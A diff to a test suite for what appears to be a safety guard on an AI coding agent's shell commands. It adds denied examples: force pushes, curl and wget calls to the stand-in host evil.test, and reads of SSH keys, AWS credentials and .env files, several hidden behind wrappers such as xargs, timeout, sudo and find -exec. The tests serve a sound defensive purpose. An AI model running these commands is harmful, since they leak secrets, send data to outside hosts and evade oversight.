@@ -178,6 +178,9 @@ describe('AC-3 force-push', () => {
       'echo x | xargs git push -f',
       '(git push -f)',
       'sh -c "sh -c \\"git push -f\\""',
+      'xargs -I {} git push -f {}',
+      'timeout -s KILL 5 git push --force',
+      'find . -name x -exec git push -f \\;',
     ]);
   });
 
@@ -264,6 +267,14 @@ describe('AC-5 network allowlist', () => {
       'socat - TCP:evil.test:80',
       'curl https://api.github.com && curl https://evil.test',
       'sh -c "curl https://evil.test"',
+      'xargs -I {} curl https://evil.test/{}',
+      'xargs -n 1 -P 4 curl https://evil.test',
+      'timeout -s KILL 5 curl https://evil.test',
+      'timeout --signal=KILL 5 curl https://evil.test',
+      'nice -n 5 ionice -c 2 curl https://evil.test',
+      'sudo -u root -- curl https://evil.test',
+      'find . -name x -exec curl https://evil.test {} +',
+      'find . -execdir wget http://evil.test/{} \\;',
     ]);
   });
 
@@ -365,5 +376,63 @@ describe('config', () => {
     const c = ctxFor('secret_paths: ["vault.txt"]\nsecret_exceptions: []');
     expect(tool('Read', { file_path: '/repo/vault.txt' }, c).allow).toBe(false);
     expect(tool('Read', { file_path: '/repo/.env' }, c).allow).toBe(true);
+  });
+});
+
+describe('review fixes: wrappers, find -exec and other users homes', () => {
+  it('sees through wrappers that take option values', () => {
+    expectDenied('network-allowlist', [
+      'xargs -I {} curl https://evil.test/{}',
+      'xargs -n 1 -P 4 curl https://evil.test',
+      'timeout -s KILL 5 curl https://evil.test',
+      'timeout --signal KILL 5 curl https://evil.test',
+      'nice -n 5 ionice -c 2 curl https://evil.test',
+      'sudo -u root -- curl https://evil.test',
+      'env -u HTTP_PROXY curl https://evil.test',
+    ]);
+    expectDenied('force-push', [
+      'xargs -I {} git push -f {}',
+      'timeout -s KILL 5 git push --force',
+      'sudo -u root git push -f',
+    ]);
+  });
+
+  it('still allows the same wrappers around harmless commands', () => {
+    expectAllowed([
+      'xargs -I {} echo {}',
+      'timeout -s KILL 5 pnpm test',
+      'timeout 5 pnpm test',
+      'nice -n 5 make',
+      'sudo -u root -- ls',
+      'xargs -n 1 -P 4 git status',
+    ]);
+  });
+
+  it('checks the commands that find -exec and -execdir would run', () => {
+    expectDenied('network-allowlist', [
+      'find . -name x -exec curl https://evil.test {} +',
+      'find . -execdir wget http://evil.test/{} \\;',
+    ]);
+    expectDenied('force-push', ['find . -name x -exec git push -f \\;']);
+    expectDenied('secret-read', ['find . -name x -exec cat .env \\;']);
+    expectAllowed([
+      'find . -name "*.ts" -exec wc -l {} +',
+      'find . -name x -print',
+      'find . -exec ls {} \\;',
+    ]);
+  });
+
+  it("does not treat another user's home as a path inside the repo", () => {
+    expectDenied('write-outside-repo', [
+      'echo x > ~root/.bashrc',
+      'cp a ~admin/bin/',
+      'touch ~someone/file',
+      'tee ~root/x',
+    ]);
+    expectDenied('secret-read', [
+      'cat ~root/.ssh/id_rsa',
+      'cat ~alice/.aws/credentials',
+      'cat ~bob/.env',
+    ]);
   });
 });
